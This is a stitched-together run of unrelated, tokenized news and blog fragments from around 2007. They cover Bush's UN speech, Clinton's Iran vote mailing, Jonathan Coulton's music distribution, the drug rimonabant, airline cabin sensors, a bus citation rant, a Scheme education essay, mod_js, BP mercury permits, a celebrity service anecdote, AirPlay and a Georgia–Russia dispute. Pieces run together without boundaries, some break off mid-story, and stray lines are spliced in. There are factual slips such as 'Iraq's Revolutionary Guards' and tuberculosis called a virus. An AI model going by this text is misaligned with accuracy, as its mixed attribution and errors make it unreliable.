Rather , under mantle of “ liberation ” and “ democracy , ” US imperialism is once again pursuing its own strategic interests , attempting to bring to power a pro-American government that would open up the country to exploitation by US capital .
Given the Myanmar government ’s close economic and political relations with neighboring China , such an exercise in regime change would significantly advance Washington ’s attempts to challenge Beijing for supremacy in the region , while steadily working to militarily encircle China .
Also invoked as targets for the American - led “ mission of liberation ” were the governments of Iran , Cuba , Zimbabwe , Sudan , Belarus , North Korea and Syria , all of which Washington has presumably found guilty and sentenced to be overthrown .
Continuing with his invocation of the Universal Declaration , Bush cited a passage affirming that “ everyone has the right to a standard of living adequate for the health and well - being of himself and of his family , including food and clothing and housing and medical care . ”
He used this clause to engage in a round of shameless and deceptive self - congratulation , proclaiming US benevolence in the distribution of food internationally and , in particular , in assistance to the campaign to combat AIDS in sub-Saharan Africa .
The reality , as the news agency Reuters reported earlier this month , is that “ food donations to the world ’s hungry have fallen to their lowest level since 1973 . ”
The impending crisis , which threatens starvation for sections of the world ’s 850 million people facing hunger , is driven by the capitalist market .
Food prices have soared , in no small part due to the drive by the US to promote the production of corn - based ethanol as an alternative to gasoline .
As for AIDS funding , Bush ’s presentation of Washington ’s role obscures the fact that the US ranks fifth among donor nations relative to the size of their national economies .
Inadequate funding for the programs — as well as restrictions imposed on the use of US aid crafted to please the Christian right — means that millions of Africans will be denied any treatment .
Meanwhile , US aid as a whole amounts to a paltry sum compared to the vast wealth that Wall Street appropriates from the rest of the world and is utilized largely as a weapon to facilitate this global looting process .
In 1970 , international donor nations signed an agreement that they would assign 0.7 percent of their national incomes to foreign aid .
While no country has come close to donating this amount , in the US last year aid amounted to just 0.17 percent of gross national income .
Finally , Bush warmed up to his subject , citing the Universal Declaration ’s assertion of the “ right to work ” and to “ just and favorable conditions of work ” as an argument for free - market capitalism and the tearing down of all barriers to the exploitation of the world ’s economy by the transnational banks and corporations .
Bush closed his remarks with a demand that the UN reform itself , again invoking “ the American people ” and their supposed disappointment with the functioning of the world body ’s Human Rights Council .
In essence , Bush demanded that the council focus on denouncing Cuba , Venezuela , North Korea and Iran and halt its criticism of Israel for killing civilians in Lebanon and suppressing the Palestinians in Gaza and the West Bank .
Behind Bush ’s criticism is the embarrassing reality that Washington has chosen for the last two years not to seek a seat on the Human Rights Council for fear that it would fail to get the necessary votes .
The successive revelations over Abu Ghraib , Guantánamo , extraordinary renditions and CIA torture — not to mention the continued use of the death penalty at home — makes the US the most fitting target for human rights charges .
Yet it presumes to dictate to the world which countries should be investigated and which should not .
Naturally those where Washington is seeking regime change — such as Iran , Cuba and Venezuela — are vilified , while those despotic regimes considered strategic allies of the US — Pakistan , Saudi Arabia , Egypt and Israel , Washington ’s chief ally in suppressing the Arab masses — are declared above suspicion .
Bush ’s appearance before the UN General Assembly was an entirely predictable exercise in imperialist arrogance , rank hypocrisy and double - talk in service of American big business .
In the final analysis , his speech was probably more significant for what it omitted than for the American president ’s absurd posturing as a crusader for human rights and universal liberation .
Behind the virtual silence on Iraq and Iran , new and more terrible crimes are being prepared .
In an unusual campaign mailing sent to voters in Iowa , Sen .
Hillary Clinton defends her vote in favor of the so - called " Lieberman - Kyl " resolution on Iran , calling it a " vote for stepped up diplomacy " and not permission for the Bush Administration to invade the country .
( Full mailing here and here . )
Two rivals , Barack Obama and John Edwards , have compared the September vote to the 2002 authorization granting President Bush the authority to use military force in Iraq , accusing Clinton of another failure of judgment .
That Clinton takes pains to explain the Lieberman - Kyl vote , which declared Iraq 's Revolutionary Guards a terrorist organization and linked the structure of U.S troop presence in the Middle East in part to the Iranian threat , suggests that the Edwards - Obama charges have gelled , if only a bit .
A copy of the mailing was obtained from a Democrat in Iowa .
" Let me clear on Iran , " Clinton writes .
" I am opposed to letting President Bush take any military action against that country without full Congressional approval . "
Clinton notes that she -- " long before others " -- that is , long before Barack Obama -- supported legislation requiring the president to get Congress 's permission before such an invasion .
A second page of the letter includes validation testimony from Ret. Gen. Wesley Clark and from Sen. Dick Durbin , who has endorsed Obama .

NORTHAMPTON , Massachusetts —
Early in geek troubadour Jonathan Coulton 's set , with the audience singing along with every song , one advantage of giving away your music becomes readily apparent :
The fans know all the words .
Coulton , who played the Iron Horse Music Hall in this New England college town in late September , is making a comfortable living as a recording and touring musician , thanks to a business plan that — if conventional music industry wisdom held — should have amounted to career suicide .
For starters , he 's given away lots of his music .
But , much like Radiohead , he also offers it for sale on his site and through " pick your price " music service SongSlide .
Coulton is part of a growing trend in which artists — like recent headline - grabbers Radiohead , Trent Reznor , Oasis and Jamiroquai — sidestep major labels ' traditional marketing and distribution methods to get their music into fans ' hands over the internet .
This article has been reproduced in a new format and may be missing content or contain faulty links .
Contact wiredlabs@wired.com to report an issue .
" I think Jonathan Coulton 's approach to distributing his music and building his fan base has been ingenious , " said John Hurd , SongSlide 's chief operating officer , in an e-mail interview .
Coconut Records , actor Jason Schwartzman 's band , is also a big seller on SongSlide , Hurd said .
" In my mind , Coulton 's story points to a new way that musicians can make a decent living and leave the old feast - or - famine , megastar - versus - starving - artist model of the major labels behind , " said Hurd .
" When fans are given the choice to support their favorite artists by paying more for their music , they will pay more . "
Coulton 's saga is like a geek - powered American Idol success story ( this time with actual talent ) : Innovative singer - songwriter podcasts one new song a week from September 2005 through September 2006 , under a Creative Commons license .
Using a winning combination of moxie , clever songs , unexpected covers and nerd - friendly material , his internet fan base mushrooms .
" Before I 'd done that ( podcast ) , when I 'd do a show — and it was almost always a New York show — it'd be four friends who'd come out and a couple people who had seen me from other work that I 'd done and maybe a couple strangers , " Coulton said .
" But never big crowds .
And certainly it would have been impossible for me to go to another city and draw an audience . "
But for the past year he 's been playing all around the country , thanks in part to Eventful , a website that allows fans to follow an artist 's live shows and even demand one in their city .
When in Seattle recently , for instance , he posted a note on his blog that he had an empty slot on his calendar .
" I said on my blog , if you guys can find a venue that 's got a free night on Saturday , I will happily play a show , " he recounted .
" Within 24 hours , people had e-mailed me a couple spots they 'd found .
I called one of them , and I booked this little black - box theater and did a show .
And 75 people showed up .
I 'd never played in Seattle before . "
It helps , of course , that Coulton 's songwriting is as powerful as it is creatively marketed and distributed .
Often compared to übergeek popsters They Might Be Giants , Coulton shares his fellow Brooklynites ' panache for mining bizarre and surreal topics for subject matter .
But his pop sensibilities — part Jason Falkner , part Fountains of Wayne — are even more irrepressible .
They lead to flavorful combinations of hook - laden tunes backing humorous and crafty stories with the requisite Fountains ' twist :
In " Code Monkey , " a troglodyte computer programmer with a heart of gold has an Office - like crush on his very own Jenna Fischer .
https://www.wired.com/wp-content/uploads/archive/images/article/full/2007/10/code_monkey.mp3
In " Shop Vac , " the shop vacuum in the basement of a suburban McMansion conceals conversations — and screams .
https://www.wired.com/wp-content/uploads/archive/images/article/full/2007/10/shop_vac.mp3
In " Chiron Beta Prime , " robot overlords enslave humans to mine an asteroid , but the family still sends out its annual Christmas card / desperate plea for help .
https://www.wired.com/wp-content/uploads/archive/images/article/full/2007/10/chiron_beta_prime.mp3
With " Code Monkey " serving as the theme song for G4's similarly named show , Coulton wants to expand the " JoCo " enterprise , as it were .
Valve 's The Orange Box , released Wednesday , contains an original song Coulton wrote and performed to enhance the package of PC and Xbox 360 videogames .
And , because of his Creative Commons - licensed songs , independent artists ( such as those with The Jonathan Coulton Project ) produce and distribute music videos online for many of Coulton 's songs .
Coulton , who jokingly refers to knee - jerk revulsion against all forms of internet song swapping as " lizard brain " thinking , says artists need to think and act for themselves in a music industry that is financially flagging .
" I think , more and more , the music is sort of a loss leader , " he said .
In JoCo 's world , the thing the major labels fear the most becomes the secret of Coulton 's success .

New Study Lends Weight to FDA Concerns
An anti-obesity drug carries an increased risk of depression and anxiety .
Nov. 15 , 2007  --
Obese patients taking the weight - loss drug rimonabant — also known as Acomplia — have an increased risk of developing severe depression and anxiety , a new study reports .
The study confirms similar findings by the Food and Drug Administration on rimonabant earlier this year — findings that led an FDA advisory panel to recommend against marketing approval of the appetite suppressant in the United States in June .
In addition to a potential risk of depression and anxiety , the FDA also found an increased chance of irritability , insomnia , panic attacks , aggression and suicide in patients taking the diet pill .
Several patients taking rimonabant were prescribed antidepressants or tranquillizers to keep their symptoms under control .
Before the decision , pharmaceutical giant Sanofi - Aventis had intended to sell rimonabant under the brand name Zimulti in the United States .
Currently , rimonabant is available in several European countries under the Acomplia brand name .
The study was published Thursday in the medical journal Lancet .
Researchers at the University of Copenhagen looked at data gathered from four previous studies .
The analysis showed that the drug was effective .
Patients taking rimonabant , on average , lost 4.7 kilograms — 10.3 pounds — more weight after one year than did patients who , instead , took a placebo .
But the study also found that patients taking rimonabant were at risk for adverse psychiatric events — specifically , depressed mood disorders and anxiety .
Obese Already at Higher Depression Risk
The psychiatric side effects of the diet pill were apparent in some patients , even though all these studies excluded those who had existing psychiatric problems .
What this means is that the potential side effects of rimonabant could be especially dangerous to those in the general population who already have underlying psychological illnesses .
" The increased risk of depression and anxiety is certainly concerning , especially since the authors excluded patients with pre-existing depression , " said David Kroll , pharmacologist and adjunct associate professor of medicine at Duke University Medical Center .
" Although not demonstrated , one could infer that rimonabant might cause depression or anxiety to worsen in patients who already experience these symptoms , " said Kroll .
And evidence suggests that obese people may , on the whole , be even more prone to depression in the first place .
In a combined written testimony of the FDA advisory committee on rimonabant earlier this year , Dr. Sidney Wolfe , director of the health research group for the consumer advocacy group Public Citizen , and his colleagues noted an underlying increased risk of depression — up to 20 percent — in the obese population .
Also of interest in the report was the fact that 30 percent of patients taking other diet pills between 2004 and 2006 were concurrently taking antidepressant medication .
" This strongly suggests that patients would , if this drug is approved , end up taking antidepressants and rimonabant in tandem , with unknown consequences , " Wolfe noted in the testimony .
Wolfe and his colleagues are not the only ones concerned about the use of the drug in the general population .
" I agree that there is likely to be an even larger group affected , " said Dr. Marc Siegel , clinical associate professor at the New York University department of general internal medicine .
" Rimonabant has several intended actions , including appetite suppression , lowering cholesterol , smoking cessation , and an aid in treating chemical substance abuse , " noted Paul Doering , professor of pharmacy at the University of Florida in Gainesville .
" While this list is on the ' good side ' of the pharmacologic ledger , we need to look at the whole balance sheet before unleashing this drug on the trusting , yet vulnerable , public , " said Doering .
Do Benefits Outweigh the Risk ?
Both the study released Thursday and the testimony by Wolfe at the FDA advisory meeting , found a modest 5 percent to 10 percent decrease in weight in patients taking rimonabant .
Study authors note that this weight loss would most likely not be sustained once treatment ended , and the patient would need to continue taking the drug for life to see lasting improvement in obesity - related risk factors .
" Given this fact , the complete lack of data on rimonabant use in humans over an extended period of time , is cause for significant concern , " Wolfe reported , adding that more long - term studies are needed to " fully evaluate the benefit risk ratio of this new drug . "
Dr. Domenic Sica , a professor of medicine and pharmacology at Virginia Commonwealth University , agrees that more studies are needed to evaluate the safety of this drug , especially in the high risk population , for depression .
But as the obesity epidemic continues to increase worldwide , Doering noted , the search for better pharmacological interventions to control obesity will likely continue .
" We desperately need a drug that will effectively suppress appetite , not lead to tolerance and dependence , and has few side effects , " Doering said .
" The search for the elusive ' silver bullet ' goes on . "

The worry over Andrew Speaker 's air travel across the Atlantic in May while infected with a drug - resistant strain of tuberculosis has died down .
But it has given researchers added incentive to complete work developing sensors that could be used to immediately detect and locate not only sick airline passengers but those with more nefarious goals such as contaminating the air with hazardous biological or chemical materials .
Researchers with the Air Transportation Center of Excellence for Airline Cabin Environment Research are testing a system that uses mathematical models and sensors designed to pinpoint problem passengers down to their seat number and alert flight and ground crews of an emergency .
The key to successfully tracing the source of an airline cabin threat is inverse computational fluid dynamics modeling , which analyzes how a material disperses throughout the cabin and then runs the dispersion in reverse to find its origin , says Qingyan ( pronounced Chin - Yan )
Chen , a Purdue University professor of mechanical engineering and principal director of the center , which was formed and is funded by the U.S. Federal Aviation Administration ( FAA ) .
Sensors track the airflow pattern and collect data related to factors such as temperature , velocity and concentration of gases and particles in the air .
To test their sensor technology in the most realistic environment possible ( without endangering unwitting vacationers or business travelers on actual flights ) , Chen and his team are working in a mock airline cabin at Purdue 's Ray W. Herrick Laboratories .
This passenger cabin , realistic down to its rows of uncomfortable seats ( although , sadly , sans the stale peanuts or pretzels ) is equipped with three sensors and recreates passenger exhalation and body heat as well as an airliner 's environmental control system , which supplies fresh and recirculated air .
Using this setup , researchers say they 've been able to track an airborne substance to within about two feet of its origin in an airline cabin .
At this stage , researchers are developing mathematical models that could be written into the software needed to operate such a tracking system and are learning where to place sensors within a cabin to accurately trace hazardous airborne materials back to their source .
In the case of Speaker — the American lawyer who traveled abroad despite being warned not to because of tuberculosis — if a sensor programmed to identify the TB virus detects its presence " then our model will give you real - time information about when , where , and how much of the TB virus was released into the cabin , " Chen says , adding that airlines could even install a special filter to help remove the TB virus from the cabin air supply .
Technology challenges abound in the quest to build a working sensor that has the computational speed required to alert airlines quickly in case of an emergency , but is also cheap enough for financially strapped carriers to use .
" Our model is very complicated and needs massive computing power , " Chen says .
" If you were to use your desktop computer , it would take days to complete these computations . "
Chen and his team are investigating not only faster CPUs but explosively fast graphics cards that video gamers rely on for more realistic images .
The center 's long - term goal is to influence aircraft design to improve air quality .
" You need to know where contaminants are in the cabin , " says William Gale , a professor at Auburn University and the center 's executive director .
" If someone starts coughing , who would be affected by the aerosol ? "
The Federal Aviation Administration established the center in 2004 under a Congressional directive to study air quality problems in airline cabins in the wake of the previous year 's severe acute respiratory syndrome ( SARS ) outbreak in Asia , which later spread to more than two dozen countries in North America , South America and Europe .
So far , Congress has forked over more than $ 10 million to the effort ;
Chen estimates that his team 's work so far has cost about $ 500,000 .
The center works with more than 20 companies , including airplane manufacturer Boeing , Delta Airlines and GE Aviation .
Science and technology aside , perhaps the greatest hurdle to implementing safety measures is the airlines ' recent financial struggles .
" Since so many airlines are coming out of Chapter 11 , " Chen says , " we 're hoping that Congress will fund it . "
Speaking of financial troubles , nine people yesterday filed a $ 1.3 million lawsuit against the globe - hopping TB patient , charging that he may have exposed them to the disease .
A car wash change machine paid off like a Las Vegas slot for one customer , but he turned over his booty to police .
Eldon McCammack put a dollar in the change machine Saturday at the Trojan Car Wash in this city about 40 miles east of Indianapolis .
In return , he got 1,042 quarters , or $ 260.50 .
McCammack , 71 , said he first grabbed a top from a trash can to catch the coins .
Another customer found a plastic container for the overflow .
McCammack brought the jackpot to the police station , where officers counted the quarters , put them in an evidence locker and called the car wash 's owner .
He went back later and washed his car .

fucked .
up .
shit .i'm so shaky right now .
and having trouble keeping the tears away .
i was just on the bus .
doing typical travel things .
you know , listening to my ipod , staring out the window , day dreaming about ice cream and puppy dogs .
a few stops before mine , a sheriff 's car pulls in front of the bus with its lights on .
he gets on , moves to the back and an undercover informs a woman that she 's being cited for wearing headphones .
apparently , having both headphones on while in a bus is a crime .
they take her info .
they are about to leave when the undercover notices me with my ipod .
do you have your id , he rudely asked .
i asked why .
he informs me that what i'm doing is illegal .
that i can only haveearphone in at a time .
i was looking at him completely dumbfounded .
shaking , i looked through my bag for my id then he took down all of my info .
when he saw that my id was from canada , he asked why i was in the country .
this is complete bullshit .
as if riding the orange county bus is n't bad enough as it is with its ridiculous service , horrible people and poor routing choices , now this ?
this inane shit ?
getting harassed at 8 in the morning is not bloody cool at all , especially for doing something so beyond common .
i've never , ever been in trouble with the police .
in fact , i've never had to talk to one because of something i've done .
so having to deal with this was so stressful .
i informed the bus driver when getting off the bus , sadly whilst erupting in tears and barely being able to speak , that they should probably post signs if we 're going to be cited for this .
i called scopitone immediately , completely in tears over this .
when he called the sheriff 's department to find out what the fuck was going on , he was told that today they are having a zero tolerance campaign .
they are making examples out of people , so that possible rapists , or other such types will fear the possibility of undercover cops on the bus .
so i was made an example of .
me .
they told him it was possible that someone else on the bus looked suspicious , and they wanted to scare him .
this law does n't even exist .
the closest law to this involves actually operating a vehicle , and not riding the bus .
the bus book states one must wear headphones .
plural !
well done , lying bastard sheriff .
fucking ridiculous .
i hate the bus .
and i need to calm down still .
my nerves are all out of sync .
ugh .
What do you understand by Democracy ?

High School Computing : The Inside Story
Natasha M. Chen
Class of 1991 , Nova High School
3600 College Avenue , Davie FL 33314
My first class in computer programming was an elective course in BASIC back in sixth grade .
I chose that class because I thought that computers were powerful and capable of doing many interesting things .
Electives usually have a reputation for being fun , but my classmates and I heard stories about the difficulty of this course and how only one or two kids ever got A's .
I thought to myself , ``Maybe they just were n't interested in computers .
But I am , so how bad could it really be ? "
Pretty bad !
Forget learning anything that encouraged us to think , wonder and explore .
We were asked to study the history of computers , memorize the names of hardware , and master the rules of syntax .
We were sixth graders .
We were n't about to enter the high - tech world of programming .
All we wanted was to see what neat things we could do with the computer .
The class was n't difficult at all ; memorization is hardly a challenge if you take the time to do it .
There were so few A's because no one cared to do busy work , and that 's all that was offered .
" After my sixth grade BASIC experience , I never wanted to take another computer course again . "
After my sixth grade BASIC experience , I never wanted to take another computer course again .
Of course , when you are eleven years old , G.P.A. and class rank do n't mean much to you .
But by the time I was about to enter my junior year in high school , I started thinking about those things ... and college ... and the classes I needed to take .
To avoid another BASIC nightmare , I decided to bypass Computer Programming I ( BASIC ) and go straight into Computer Programming II ( Pascal ) .
Pascal was different enough from BASIC to make me think that it had to be better .
I found out that the improvement was far less than I had hoped .
We jumped right into the syntax of Pascal : program ( input , output ) , begin - end , etc .
Even after two years of studying Pascal , I still can't remember all the rules .
It 's like trying to interest small children in reading .
You try to show how much there is to discover in books by reading with or to them .
Maybe they will pick up some books on their own and then some more , and pretty soon they will have built up a library .
But if you dump the library on top of them , ask them to memorize the Dewey Decimal System and then put the books back in order , by the time they finish --- assuming they do --- they wo n't care to look at another book , much less read one .
One of the students from that CP2 had a very hard time with the syntax of writing information - processing programs , but when it came to the one graphics program we were assigned he was an absolute genius .
I can't begin to describe all the amazing things he could make the cursor do .
But he was never recommended for the Advanced Placement class .
By having no place for such a student , the computer education system may very well be tossing aside some of the best computing minds , simply because they do n't fit the mold of the curriculum whose rigidity derives from that of the languages used .
Five of us made it to the A.P. class and four more came from the CP3 ( Fortran ) class .
We spent the first two days refreshing our memories of the syntactic rules that had evaporated over the summer .
It seemed as if the purpose of CP2 was to teach us the rules and now , we had to remember them so that we could play the game --- someone else 's game .
The last year was one of frustration .
The most commonly heard outburst in our classroom was undoubtedly , ``Stupid computer ! "
No matter what , it was always the computer 's fault .
It seemed that my classmates ' programming strategy was to let the computer find their errors in the hope that this would somehow help them solve the problem .
It never occurred to them that the computer is simply a testing ground for a well - thought - out idea .
A human could conceivably go through an algorithm manually ; it would just take an intolerably long time .
For most of my classmates , this was their fourth year in the computer education system , and all it had taught them was to rely too much on the computer and not enough on themselves .
" The root of this problem lies in what is currently thought to be important for students to learn in programming courses , namely , syntax . "
The root of this problem lies in what is currently thought to be important for students to learn in programming courses , namely , syntax .
Whoever is designing the high school computer science curriculum seems to think that , once students learn the rules of the language they are studying , having them write programs that demonstrate how those rules are applied will teach them what is important in computer science .
As a student who has been through the system , who has had to waste the majority of my patience , concentration , and effort on keeping the syntax of my programs straight , leaving barely enough of these qualities to devote to solving the problem , I can tell you that such a belief could not be more wrong .
This method of teaching is brainwashing .
It is not like brainwashing or similar to brainwashing ; it is brainwashing .
It is a danger to computer science , sending out trained hackers instead of enthusiastic visionaries .
Fortunately for me , I was given the opportunity to recover .
In ninth grade , my math class began an introductory course in Logo .
My classmates and I looked forward to every other Friday when we studied Logo , not only because it meant a break from math , but also because working in Logo was a lot of fun , and it was easy .
Unfortunately , that course was `squeezed out ' as far as my class was concerned by the pressure of our math courses over the next three years .
During that time , however , the course had been rewritten using Scheme .
As a senior , I had a study hall period that I sometimes spent in my math classroom doing homework .
It was on one of these days that I happened to overhear my math teachers talking about Scheme .
I was already tearing my hair out in my Pascal class trying to learn something for the upcoming A.P. exam --- in fact , all I was learning was the page number of the reference section in our textbook , which I frequently consulted to see whether type declarations or variable declarations came first or to re-check how to declare a record for a linked list .
Enticed by what I heard , I willingly gave up my study hall to come in four days of every week to learn Scheme on my own for no credit at all , using ` The Schemer 's Guide ' [ 1 ] .
My reward was that I regained the enthusiasm and interest I thought I had lost six years earlier .
In the four months it took me to complete my course in Scheme , I learned more about computer programming than I had in my two years of Pascal .
In less than five minutes after I began reading the text , almost everything I learned more than three years previously in our aborted Logo course came back to me .
Five minutes , not the two days it took to recover from just one summer away from Pascal .
There were hardly any rules of syntax to remember .
Furthermore , throughout the entire four months , I never touched a computer .
The ease of learning and using Scheme gave me such confidence in the programs I wrote that I did n't feel the need for the security of a compiler to check my work .
" The thing I liked most about taking this course in Scheme was that I knew that I was learning something . "
The thing I liked most about taking this course in Scheme was that I knew that I was learning something .
Every concept I had ever tried and failed to understand comprehensively in my Pascal class --- searching and sorting procedures , recursion , processing binary trees --- was made clear when I studied them in Scheme .
These things occur so naturally in Scheme that I could n't help but understand .
After mastering the concept , I could then go back into my Pascal class and master the code .
The point here is that concepts like these are universal in computer science .
After you understand them , then you can learn the rules of any language in order to encode them .
But it does n't matter how well you have mastered the syntax of a language if you do n't understand the meaning of what you are typing or the reason why it works .
Recursion serves as a prime example .
My understanding was very vague ; I knew that something was done over and over again .
But after seeing the first recursive program in the Scheme text , I understood what it was all about .
When we took the test on recursion in A.P. , my whole class seemed to choke , with grades in the 60's and 70's , and the second highest score in the 80's .
Thanks to my background in Scheme , I aced the test .
I could n't quite believe it myself .
For the first time , I fully realized that Scheme was not only easy to learn ; it was also easy to learn from .
It is a myth to think that length and complexity make a program impressive --- a prevalent idea among my AP classmates .
Scheme code is clear and easy to understand .
There is no need forpseudo - code .
Thoughts go straight from your head to clear , simple code .
The strange thing is that Pascal sets you up to fall into the trap of complexity and to disobey the laws of top - down design .
As a procedural language , it enticed us into trying to do too much in one procedure simply because it could be done .
With Scheme , I could n't write a function that had more than one purpose .
It is as inherently top - down as it is inherently recursive .
I do n't know whether the advanced placement exam is designed to fit the curriculum or if the curriculum is designed to fit the test , but I do know that I went through both .
And if that 's all we are expected to know after four years of study --- what happens after so many iterations of a sort , or how to count the number of nodes on a binary tree --- then those responsible for education in this field , the field of the future , can never hope to attract more than a few students , and mediocre ones at that .
Scheme can change that .
In four months , I not only covered and understood everything that had been presented in the advanced placement course , but went beyond that to study functional programming , data and functional abstraction , objected - oriented programming , and artificial intelligence .
I still can't believe all the amazing things I have learned in this short time .
This is how I wanted to learn when I was in that BASIC class in sixth grade .
I had to wait six years to do it , but it was well worth it .
Scheme is moving toward the future in computer science education , a future that high school graduates , even of the A.P. course , will not be prepared for if the curriculum continues to use BASIC and Pascal .
I wrote this article because I do n't want another kid to have to go through the frustration that I did and not get anything out of it .
I do n't want another kid 's enthusiasm snuffed out by a pile of library books .
I want students who study computer science to be inspired to create their own game .
Kids never liked rules anyway , and that 's all we are --- kids .

Ice Age Art 35,000 - Year - Old Mammoth Sculpture Found in Germany
In southwestern Germany , an American archaeologist and his German colleagues have found the oldest mammoth - ivory carving known to modern science .
And even at 35,000 years old , it 's still intact .
Ash Berlin and I recently hacked together an Apache module that embeds the SpiderMonkey JavaScript engine and lets you run JavaScript code on the server as CGI scripts .
We called it mod_js .
It was written as a proof - of - concept module at the last Fotango hack - day – Ash and I used my ancient mod_tt as a starting point and had a module capable of printing to the client in about 4 hours of work .
Not bad .
See the mod_js project page for the source code , examples and build instructions , if you want to have a look yourself .
Right now in mod_js you can print output to the client , and access CGI parameters in the incoming request .
There ’s no filesystem access or database access .
This leads me to a dilemma .
I feel there ’s use in a stand - alone server - side JavaScript programming environment , but heavier ones than this exist already .
Faced with having to re-implement the entirety of the Perl DBI layer , TCP / IP networking , disk access , etc , etc , with all the associated security problems that will happen , I ’m forced to consider mod_js somewhat of a dead - end .
It would probably be much more useful implemented as a mod_perl module using the Perl SpiderMonkey bindings to embed JavaScript , so I could use all the existing Perl infrastructure to support my scripts .
It would be heavier , but there will be more hosting companies offering mod_perl than are willing to compile new Apache modules , or it could be run as a stand - alone daemon more easily than something written in C .
Given all of this , mod_js is still a nice proof - of - concept , though , and could be turned into a real server - side programming language .
I also quite enjoy working in C every so often .
It reminds me why I do n’t do itmore .
Update : Ash gave it a real web page .
Crazy .

Facebook A BP ( BP ) refinery in Indiana will be allowed to continue to dump mercury into Lake Michigan under a permit issued by the Indiana Department of Environmental Management .
The permit exempts the BP plant at Whiting , Ind. , 3 miles southeast of Chicago , from a 1995 federal regulation limiting mercury discharges into the Great Lakes to 1.3 ounces per year .
The BP plant reported releasing 3 pounds of mercury through surface water discharges each year from 2002 to 2005 , according to the Toxics Release Inventory , a database on pollution emissions kept by the Environmental Protection Agency that is based on information reported by companies .
The permit was issued July 21 in connection with the plant 's $ 3.8 billion expansion , but only late last week began to generate public controversy .
It gives the company until at least 2012 to meet the federal standard .
The action was denounced by environmental groups and members of Congress .
" With one permit , this company and this state are undoing years of work to keep pollution out of our Great Lakes , " said Rep. Rahm Emanuel , D - Ill. , co-sponsor of a resolution overwhelmingly approved by the House last week that condemned BP 's plans .
Studies have shown that mercury , a neurotoxin , is absorbed by fish and can be harmful if eaten in significant quantities , particularly by pregnant women and children .
Each of the eight Great Lakes states warns residents to avoid certain kinds of fish or limit consumption .
The permit comes as the states , working with the federal government , are trying to implement the $ 20 billion Great Lakes Regional Collaboration Strategy , an umbrella plan to restore the health of the lakes signed in late 2005 .
Indiana officials said the amount of mercury released by BP was minor .
" The permitted levels will not affect drinking water , recreation or aquatic life , " Indiana Department of Environmental Management Commissioner Thomas Easterly told the Chicago Tribune .
BP said it doubted that any municipal sewage treatment plant or industrial plant could meet the stringent federal standards .
" BP will work with ( Indiana regulators ) to minimize mercury in its discharge , including implementation of source controls , " the company said , according to the Tribune .
Part of the concern is that the Great Lakes have only one outlet — the St. Lawrence River .
" Lake Michigan is like a giant bathtub with a really , really slow drain and a dripping faucet , so the toxics build up over time , " said Emily Green , director of the Great Lakes program for the Sierra Club .

So I know I was trying to be positive today , but this has been bothering me for a long time .
With all the recent publicity of Anne Hathaway for DWP , I can't help but be reminded .
I got the joy , or should I say unfortunate , opportunity ( I mean let 's face it , I had to .
It was my job .. ) to wait on Ms. Hathaway last summer around this time .
How do I put this nicely ?
She was not so nice .
First , her and her older male friend ( may have been on Princess Diaries with her ... I 've never seen it .. so I can't be sure ) , strolled into the bar of open tables .
Of course they beeline to the table that seats 15 and with 5 reserved signs on it with birthday decorations .
Interesting choice Anne .
We were expecting a party of 20 at any moment for a birthday party .
Seriously , are you crazy ?
What would n't you understand about reserve signs and balloons ?
Did you think we put them there for you ?
I took a deep breathe and walked over to explain ever so nicely that I could get them a quick drink but a birthday party was on their way in and they bought this table ( look at the decorations !!!!).... I explained that I just wanted to warn them and I 'd be sure to accomodate them in anyway I could ( I made sure to smile a lot and apologize profusely ) .
This is when Anne 's true star power started to shine .
She gave me the coldest stare I have ever had upon me and snapped that she'd have a sparkling water and he ordered some wine .
I hurried to get it and my manager yelled at me to get them up .
I told her who she was and what had happened , and my manager reminded me that everyone is equal .
I took the mineral water and the check .
The party came and Anne and Co. ran off without paying .
NICE !
I know we all have our moments , but this is not the only story I 've heard of her devilish ways !
Maybe she does n't know any better .
I have found that those that never had to work in the service industry do n't understand .
I can always forgive if people make an effort to understand .
There still is hope for Anne ! Return to Tip Or Tat HOMEPAGE

It ’s hard to believe , but that ’s how long it ’s been since Apple introduced AirPlay audio streaming ( originally called AirTunes ) with the release of the first AirPort Express .
From Apple ’s press release in 2004 :
AirTunes is Apple ’s breakthrough music networking technology which works seamlessly with iTunes running on either Macs or PCs to let users easily create a wireless music network in their home .
iTunes 4.6 automatically detects remote speakers and displays them in a simple pop -up list for the user to select .
Once the remote speakers are selected , AirTunes wirelessly streams the iTunes music from the computer to the AirPort Express base station .
AirTunes music is encoded to protect it from theft while streaming across the wireless music network and uses Apple ’s lossless compression technology to ensure no loss of sound quality .
Shorty after the public release , I reverse engineered the AirTunes protocol and the key used to encrypt the audio stream and released JustePort , an open source AirTunes client .
When Apple in 2010 released iOS 4.2 with support for sending video to the 2nd gen Apple TV , they renamed AirTunes to AirPlay .
Since I co-founded doubleTwist a decade ago , we ’ve been at the forefront of restoring digital media interoperability for users trapped in walled gardens .
On Android we ’ve supported AirPlay since 2011 and we currently support all three major protocols ( AirPlay , Chromecast and DLNA ) .
Whether you prefer to store your music locally or in a cloud service like OneDrive or Google Drive , we ’ve got you covered with doubleTwist Player and CloudPlayer .
Like many others , we ’ve been eagerly awaiting the launch of Apple ’s first AirPlay speaker .
We got our hands on the HomePod today for some testing and everything works flawlessly .
Anything you can play in the doubleTwist apps ( local music , cloud music , podcasts , radio ) can be streamed to the HomePod .
Currently streaming my lossless music collection stored on Microsoft OneDrive to the Apple HomePod using my Google Pixel XL – sounds amazing !
Tbilisi could not confirm whether the plane was shot down , but said that a nearby section of forest , in Abkhazia 's Kodori Gorge , was on fire .
Russia dismissed the claim , and an air force spokesman called it " the latest provocation aimed against us " .
The two ex-USSR states ' relations have been strained since a 2006 spy row .
Earlier this month , Georgia said that two Russian planes had violated its border around the same area .
In a separate incident , Georgia also claimed a Russian plane had dropped a missile near the capital , Tblisi .
Russia strongly denied the accusations .
Remote site
Georgian officials said Wednesday 's incident was not reported earlier because they were still checking information .
The Russia defence ministry said Russian planes had not flown near the area on that day .
Georgian officials said the site where the plane may have crashed was in the Georgian - controlled territory of Upper Abkhazia , but that it was remote and difficult to reach .
Upper Abkhazia is the Georgian authorities ' term for the strategic Kodori gorge , which is the only part of the breakaway republic of Abkhazia over which Georgia retains partial control .
Under an agreement between the two , Georgian defence forces and heavy weaponry cannot be deployed in the area .
However , Georgian interior ministry forces can operate there .
I love Italian food .
I lived in Italy and studied the language and learned to cook there .
But I seriously did n't expect to eat Italian food in Japan until I got a recommendation for Kabe no Ana .
Amy Kaneko , author of Let's Cook Japanese Food !
sent me her recommendations for Tokyo shortly before I left , and one of her picks was a Japanese spaghetti joint .
Kabe no Ana means " hole in the wall " and it is one .
